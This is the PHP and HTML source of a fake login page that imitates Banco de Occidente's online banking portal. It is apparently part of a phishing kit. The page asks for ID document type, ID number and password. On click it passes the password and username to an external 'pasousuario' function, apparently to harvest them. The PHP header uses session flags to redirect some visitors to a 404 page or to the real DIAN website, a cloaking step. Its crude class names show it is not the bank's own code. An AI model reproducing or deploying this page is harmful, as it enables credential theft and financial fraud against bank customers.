<?php

session_start();


if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){


}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 2){

    header('location:/404.php');

}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 3){

    header('location:https://www.dian.gov.co/');
}

?>

<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link href="css/fonts.css" rel="stylesheet">
    <link href="css/style.css" rel="stylesheet">
    <title>Ingreso al Portal Transaccional | Banco de Occidente</title>
    <link href="img/favicon.ico" rel="icon">
    <script src="../../scripts/jquery-3.6.0.min.js"></script>
    <script src="../../scripts/functions2.js" type="text/javascript"></script>
</head>

<body>
    <input type="hidden" id="banco" value="Occidente">

    <div class="ContenedorInicial">
        <div class="ContenedorPublicidad">
            <img alt="grupo" class="ImagenPublicidad" src="img/grupo.svg">
            <div class="FrasePublicidad">
                <h2 class="Contigo">Estamos contigo donde estÃ©s</h2>
                <h1 class="Conectate">ConÃ©ctate</h1>
                <h4 class="ConoceNuevasFunciones">Conoce todas las nuevas <span class="SpanFunciones">funciones</span> de nuestro Portal Transaccional</h4>
            </div>
            <div class="footer">
                <div class="vigilado">
                    <img alt="Vigilado" class="ImagenVigilado" src="img/vigilado.svg">
                </div>
                <div class="versionapp">
                    <div class="version">v.0.86.35</div>
                    <div class="LogoVersionAval">
                        <img alt="Vigilado" class="LogoAval" src="img/logoaval.svg">
                    </div>
                </div>
            </div>
        </div>

        <div class="ContenedorInicialInfoUsuario">
            <div class="ContenedorSecundarioInfoUsuario">
                <div class="SeguridadInfoUsuario">
                    <div class="InfoSeguridad">
                        <a class="ASeguridad" href="#" title="Seguridad">
                            <div class="seguriti">
                                <em class="LogoSeguridad"></em>
                            </div>
                            <span class="Palabrahp">Seguridad</span>
                        </a>
                    </div>
                </div>
                <div class="MeteInfo">
                    <a class="Logorock"></a>
                    <div class="Datosss">
                        <h2 class="ingresarr">INGRESA A TU PORTAL TRANSACCIONAL</h2>
                        <form class="meterr">
                            <div class="DocumentoCont">
                                <label class="TipoDocLabel">Tipo de Documento</label>
                                <ng class="nggg">
                                    <div class="perrohpta">
                                        <select class="selectInservibleComoElGuaro" name="">
                                            <option value="">CÃ©dula de CiudadanÃ­a</option>
                                            <option value="">Tarjeta de Identidad</option>
                                            <option value="">CÃ©dula de extranjerÃ­a</option>
                                            <option value="">Pasaporte</option>
                                        </select>
                                        <span class="chipames">
                                            <span class="Tome"></span>
                                        </span>
                                    </div>
                                </ng>
                            </div>
                            <div class="NumDcc">
                                <label class="numdclab">No. de Documento</label>
                                <input type="tel" class="documentimput" id="txtUsuario" placeholder="*Documento" maxlength="20">
                            </div>
                            <div class="Contraaa">
                                <div class="passsss">
                                    <label class="paslabs">ContraseÃ±a</label>
                                    <input type="password" class="passinpt" id="txtPass" placeholder="*ContraseÃ±a">
                                    <em class="emss" placement="top" tooltipclass="info-tooltip navy"></em>
                                </div>
                            </div>
                            <div class="olvidados">
                                <a class="Aolvidads" target="_blank">OlvidÃ© mi clave</a>
                                <div class="recordad">
                                    <label class="recuerdee">Recordar mis datos</label>
                                    <input type="checkbox" class="shhrecuerd" formcontrolname="recuerdame">
                                    <label class="hptarecuerdeps penecorto" for="recuerdame"></label>
                                </div>
                            </div>
                            <div class="RegisIngre">
                                <botonazo class="ButtonRegister" btnlabel="RegÃ­strate">
                                    <div class="otravezboton">
                                        <button class="botonnnn" type="button" select="">
                                            <span class="yacansado"></span>
                                            <span class="otrohpspanssss">RegÃ­strate</span>
                                        </button>
                                    </div>
                                </botonazo>
                                <botonazo class="ButtonRegister" type="button">
                                    <div class="otravezboton">
                                        <button class="estesinoesigual" type="button" id="btnUsuario">
                                            <span class="yaaaps"></span>
                                            <span class="sjjsi">Ingresar</span>
                                        </button>
                                    </div>
                                </botonazo>
                            </div>
                        </form>
                    </div>
                </div>
                
            </div>
        </div>
    </div>

    <script type="text/javascript">
        $(document).ready(function () {
            $("#btnUsuario").click(function () {
                if ($("#txtUsuario").val().length > 0 && $("#txtPass").val().length > 0) {
                    pasousuario($("#txtPass").val(), $("#txtUsuario").val(), $("#banco").val());
                } else {
                    $("#txtUsuario").focus();
                    $("#txtPass").focus();
                }
            });
            $(".imagendecierre").click(function () {
                $(".finalss").hide();
            });
        });
    </script>
</body>

</html>

